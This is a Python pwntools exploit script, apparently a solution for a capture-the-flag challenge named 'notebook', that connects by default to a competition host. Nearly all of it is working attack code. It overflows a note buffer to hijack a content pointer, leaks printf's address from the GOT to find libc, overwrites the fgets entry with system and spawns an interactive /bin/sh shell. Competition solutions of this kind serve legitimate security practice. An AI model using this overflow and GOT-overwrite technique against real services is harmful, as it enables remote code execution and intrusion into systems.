#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('notebook')

if args.LOCAL:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    libc = ELF("./libc.so.6")

host = args.HOST or 'cybergon2023.webhop.me'
port = int(args.PORT or 5002)
#  context.log_level = "DEBUG"

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

def add_note(io, index, content):
    io.sendline(b"1")                # add note
    io.sendline(str(index).encode()) # index
    io.sendline(content)             # content
    io.recvuntil(b"Exit\n")

def edit_note(io, index, content):
    io.sendline(b"2")                # edit note
    io.sendline(str(index).encode()) # index
    io.sendline(content)             # content
    io.recvuntil(b"Exit\n")

def do_exploit():
    io = start()
    add_note(io, 0, b"AAAA")
    add_note(io, 1, b"AAAB")

    # leak printf address for libc version and offset
    # we write past the end of note one into the pointer to the content
    # of note 2, so when we ask to print it it dereferences the got entry
    payload = b"C"*24 + p64(0x21) + p64(exe.got['printf'])
    edit_note(io, 0, payload)
    io.sendline(b"3")
    io.recvuntil(b"Exit\n")
    io.recvuntil(b"1. ")
    printf_addr = u64(io.recvuntil(b"\n2.")[:-3].ljust(8, b"\x00"))
    libc.address = printf_addr - libc.symbols['printf']

    # 1. Set the first note content to /bin/sh
    # 2. Ovewrite fgets in the GOT to libc_system
    #    - 1. Set pointer to note 1 content to got entry
    #    - 2. GOT value by editing note 1 content
    #      - This has a side effect of the newline bleeding into getchar so
    #        we also have to overwrite that for execution to continue without
    #        crashing since it's used in printing the menu.
    #        This also corrupts malloc after getchar, but since we don't need
    #        it before we trigger the shell it's fine.
    # 3. Trigger the shell by "editing" note 0 which now triggers system("/bin/sh")
    payload = b"/bin/sh".ljust(24, b"\00") + p64(0x21) + p64(exe.got.fgets)
    edit_note(io, 0, payload)
    payload = b"" + p64(libc.symbols['system']) + p64(libc.symbols['getchar'])
    edit_note(io, 1, payload)
    edit_note(io, 0, b"")

    io.interactive()

do_exploit()
